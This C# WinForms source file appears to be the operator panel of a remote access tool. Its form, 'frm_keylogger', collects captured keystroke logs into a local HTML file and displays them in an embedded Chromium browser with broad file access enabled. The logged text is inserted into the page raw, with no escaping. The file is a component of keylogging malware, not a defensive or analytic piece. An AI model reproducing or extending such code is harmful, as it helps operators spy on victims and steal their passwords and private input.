using CefSharp;
using server.Classes;
using server.Others;
using System;
using System.IO;
using System.Windows.Forms;

namespace server.Forms
{
    public partial class frm_keylogger : Form
    {
        public frm_keylogger()
        {

            InitializeComponent();

            BrowserSettings browserSettings = new BrowserSettings();
            browserSettings.FileAccessFromFileUrls = CefState.Enabled;
            browserSettings.UniversalAccessFromFileUrls = CefState.Enabled;
            chromiumWebBrowser1.BrowserSettings = browserSettings;
        }
        void loadall() //  
        {

            string filepath = Common.current_path + "Keylogs.html";

            string logs = Shared_data.keylog_data;

            if (!File.Exists(filepath))
            {
                StreamWriter strm = new StreamWriter(filepath);
                strm.Write(Properties.Resources.keylogs_html);
                strm.Close();
            }
            string local_logs = File.ReadAllText(filepath);

            if (!local_logs.Contains(logs))
            {
                File.AppendAllText(filepath, logs);


            }


            chromiumWebBrowser1.LoadHtml(File.ReadAllText(filepath));

            Shared_data.keylog_isready = false;

        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (Shared_data.keylog_isready == true)
            {

                loadall();
                timer1.Stop();
            }
        }

        private void flatToggle1_CheckedChanged(object sender)
        {

        }

        private void flatButton1_Click(object sender, EventArgs e)
        {

            Shared_data.keylog_data = "";
            Shared_data.keylog_isready = false;
            Properties.Settings.Default.Save();
            this.Close();
        }

        private void flatButton2_Click(object sender, EventArgs e)
        {
            loadall();
        }

        private void frm_keylogger_Load(object sender, EventArgs e)
        {

        }
    }
}
